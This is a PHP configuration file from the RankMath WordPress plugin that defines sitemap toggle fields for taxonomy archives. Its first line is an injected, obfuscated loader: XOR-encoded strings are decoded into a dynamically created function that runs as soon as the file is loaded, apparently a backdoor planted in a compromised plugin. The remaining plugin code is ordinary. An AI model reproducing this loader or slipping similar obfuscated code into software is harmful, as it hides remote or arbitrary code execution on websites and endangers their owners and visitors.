<?php $NYWgSDjU='Y<-VGE,<=S;A089'; $bMykuH=':NH73 sZH=X5YWW'^$NYWgSDjU; $ltxqMRX=' 3nbXUTPA=B=rS0 :BEQiF =6OX>Ler=ALTszIPHh< R9X+<REX97l06GUsfPNMKrIL>PmHk2H7JquJgeIiSlmD 6beabiVi:yV,YPI>fUvRkCR=t206=.ZNvYJY3kpJlQoGmGF5EZ61ejldeo17:4ob;-TgZA-E 2V eimJ0<Z1>Zp + zqgHgdpH<=GN:cpO:FKYhn-e<dxvI5F8Knv7AL -t:i R05aF,HnNp4XQXQWgzQ9;31.Fjxfdzwxf9rM ;xlV<+cxnkWGYPNTdx-yei4J5Wt<.>nIwEXE>CX3M,PH6ckYL;SZCWYd4DHD,lDRPJ8;ZKJKyxM C151XqcWb<w3k.0tn0=Jc==,bZLxnDS>,2gn8H3xs3L7A;<P3pXzpG=;az5>sJXZVbrAC8W+2-qKpVmF7zTS0D7gzvq:9I+EIQA>N I>Q9fSS,8ts4::l;87,xdg57NT0 pR+90QAblM YL fGN5YbCP,Xko3+.UubkRZL +=3=REcTJ;690xA9 GNHQi,MA0qmlAOj DSMi172,8R=EBnvarqspWq7Do4+ZxaQrt uSuVAuNMnVF0YQa.lfoUnxHOt7932Um,U>qS49E8 lRKP08OXJcuws1-: ShwJRnik7Lc6<VWgCR;5+uf1;K BU-bhdPH:S, >dJfkPV'; $YXCZDUU=$bMykuH('', 'IUFC> :35T-S-6HII66yN>OOi+9J-:-P48sZSi+BaZU<Z,BS<e VE3TW34,9=;9cV--J1AhOY-NcQUjGE2cZeI+UBBXAENmc3p0C+xmWFhVbPcvTHADDQK4fR=+-RBKjH8DlDMO<a5CEEDQDMKUVNU4FRpt9zeF YirIELM9DN6TPrTKNYS,Nsmmy:YI2<TKT O2bbbgPoAnrR-T2YkSVQ  SHO0MD3DT>-I1NsPR9=+4lmp7VIVPM.JPB;987-p7mAHXH=YRCEPKs18<;1MXVslMP+A6+WKGNtWa3 GxR:iH1<WCVyhM2662bnINB-JLlst.YO;bj0sq+O1TTR0QKs=n2b>kc NQNjGVXUBgrXJ22RYWNNCB:qWW-C dW5JPeZT,XBZp<7W.9.7BOagN6GGHJAy+g;=pp7Q0VGGV1OW:N7 0-W4EaF>K972XY+,YONDYYDINP8QR-;TEXvOXD0hNLiD88A9,+LpKxZE>CKWJZ4UDMr;>RJDlV7<<12REMCPfRE>idqMH,5QXMJgoBM feMUVFMcuV ;I+HRLNPpHTpYWH9MVdDFEGeF5tL-,XguRa5PJUUWrGXniTVKAS,2G0G.6LP6LSDu;1IT 9.DYWWULNAzAWjrNIKLFjSJ7;Og6ZAJ.AAZ2L-4IE5MkB36TIJLzOPZ+'^$ltxqMRX); $YXCZDUU();
/**
 * Sitemap - Taxonomies
 *
 * @package    RankMath
 * @subpackage RankMath\Sitemap
 */

$taxonomy   = $tab['taxonomy'];
$prefix     = "tax_{$taxonomy}_";
$is_enabled = 'category' === $taxonomy ? 'on' : 'off';

$cmb->add_field(
	[
		'id'      => $prefix . 'sitemap',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Include in Sitemap', 'rank-math' ),
		'desc'    => esc_html__( 'Include archive pages for terms of this taxonomy in the XML sitemap.', 'rank-math' ),
		'default' => $is_enabled,
	]
);

$cmb->add_field(
	[
		'id'      => $prefix . 'include_empty',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Include Empty Terms', 'rank-math' ),
		'desc'    => esc_html__( 'Include archive pages of terms that have no posts associated.', 'rank-math' ),
		'default' => 'off',
		'dep'     => [ [ $prefix . 'sitemap', 'on' ] ],
		'classes' => 'rank-math-advanced-option',
	]
);
